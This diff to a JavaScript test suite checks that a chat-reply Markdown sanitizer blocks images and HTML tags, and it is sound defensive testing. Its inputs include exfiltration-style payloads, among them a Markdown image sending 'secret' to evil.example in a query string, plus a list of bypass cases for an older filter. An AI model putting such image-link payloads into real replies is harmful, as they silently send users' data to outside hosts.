@@ -348,17 +348,24 @@ test('parse keeps icon overrides as strings of a sane length', () => {
 });
 
 test('chat replies keep their Markdown but never fetch images or read tags', () => {
-  const s = ctx.safeMarkdown;
-  assert.equal(s('look ![x](https://evil.example/?q=secret) here'), 'look \\![x](https://evil.example/?q=secret) here');
-  assert.equal(s('![a][ref]'), '\\![a][ref]');
-  assert.equal(s('<img src="https://evil.example/p.png">'), '&lt;img src="https://evil.example/p.png">');
-  assert.equal(s('</div><!-- c --><?x?>'), '&lt;/div>&lt;!-- c -->&lt;?x?>');
-  assert.equal(s('**bold** and [a link](https://example.com) stay'), '**bold** and [a link](https://example.com) stay');
-  assert.equal(s('2 < 3 and a<b'), '2 < 3 and a&lt;b');
-  // Code is shown as written.
-  assert.equal(s('use `<div>` or ``a`![b](c)`` here <i>'), 'use `<div>` or ``a`![b](c)`` here &lt;i>');
-  const fenced = '```html\n<img src=x>\n![a](b)\n```\n<img src=y>';
-  assert.equal(s(fenced), '```html\n<img src=x>\n![a](b)\n```\n&lt;img src=y>');
-  assert.equal(s('~~~~\n<b>\n~~~\nstill code <b>\n~~~~\n<b>'), '~~~~\n<b>\n~~~\nstill code <b>\n~~~~\n&lt;b>');
-  assert.equal(s('a lone ` then <b>'), 'a lone ` then &lt;b>');
+  const s = ctx.safeMarkdown, J = '\u2060';
+  // No image and no tag can form anywhere, whatever Qt's parse decides is code: each of these
+  // got past the earlier filter, which guessed where code starts and ends.
+  const inputs = [
+    'look ![x](https://evil.example/?q=secret) here', '![a][ref]', '<img src="https://evil.example/p.png">',
+    '<IMG SRC=x>', '</div><!-- c --><?x?>', 'a `b\nc` ![i](http://x/1) `d`', '```a`b\n![i](http://x/2)',
+    '\\`a ![i](http://x/3) `', '\\![i](http://x/4)', '`a``b` ![i](http://x/5) `', '# x `\n` a ` ![i](http://x/6) ` b `',
+    '```html\n<img src=x>\n![a](b)\n```\n<img src=y>', '~~~~\n<b>\n~~~\nstill code <b>\n~~~~\n<b>', '!![x](y) <<b>',
+  ];
+  for (const md of inputs) {
+    const out = s(md);
+    assert.doesNotMatch(out, /!\[|<[A-Za-z\/!?]/, JSON.stringify(md));
+    assert.equal(out.split(J).join(''), md, 'only the joiner is added');
+  }
+  assert.equal(s('look ![x](u)'), 'look !' + J + '[x](u)');
+  assert.equal(s('<img src=x>'), '<' + J + 'img src=x>');
+  // The rest of the Markdown, and a "<" that opens no tag, pass unchanged.
+  for (const md of ['**bold** and [a link](https://example.com) stay', '2 < 3 and a < b', 'a lone ` then !', '`code` and ~~~'])
+    assert.equal(s(md), md);
 });
+
